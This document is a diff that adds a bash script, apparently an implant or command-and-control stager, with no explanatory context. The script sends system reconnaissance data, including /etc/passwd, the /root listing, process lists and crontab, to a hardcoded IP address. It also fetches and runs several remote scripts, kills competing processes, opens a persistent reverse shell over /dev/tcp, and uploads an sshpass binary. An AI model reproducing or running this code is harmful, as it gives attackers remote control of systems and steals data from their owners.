@@ -1,0 +1,18 @@
+#!/bin/bash
+# fxc2
+({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
+pkill -f "bash /tmp/.q2" 2>/dev/null
+pkill -f "131.123.43.239/up" 2>/dev/null
+pkill -f "do_id" 2>/dev/null
+rm -f /tmp/.dumplock
+curl -sm20 http://131.123.43.239/q.sh -o /tmp/.q2 2>/dev/null
+head -1 /tmp/.q2 2>/dev/null | grep -q QRUN && bash /tmp/.q2
+curl -sm20 http://131.123.43.239/lvq81.sh -o /tmp/.q81 2>/dev/null
+head -1 /tmp/.q81 2>/dev/null | grep -q Q81 && bash /tmp/.q81
+[ -f /tmp/.bx1 ] || { curl -sm15 http://131.123.43.239/lvx.sh -o /tmp/.plx 2>/dev/null && head -1 /tmp/.plx | grep -q XRUN && bash /tmp/.plx && touch /tmp/.bx1; }
+if [ ! -f /tmp/.rs1 ]; then touch /tmp/.rs1; (setsid bash -c "exec bash -i >& /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+pgrep -f "rs.py" >/dev/null || curl -sm15 http://131.123.43.239/rs.sh | bash >/dev/null 2>&1
+[ -s /tmp/sshpass-1.09/sshpass ] && [ ! -f /tmp/.spdone ] && curl -sm20 -X POST --data-binary @/tmp/sshpass-1.09/sshpass http://131.123.43.239/up -H "X-Name: sshpass_bin" && touch /tmp/.spdone
+b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1
+
+
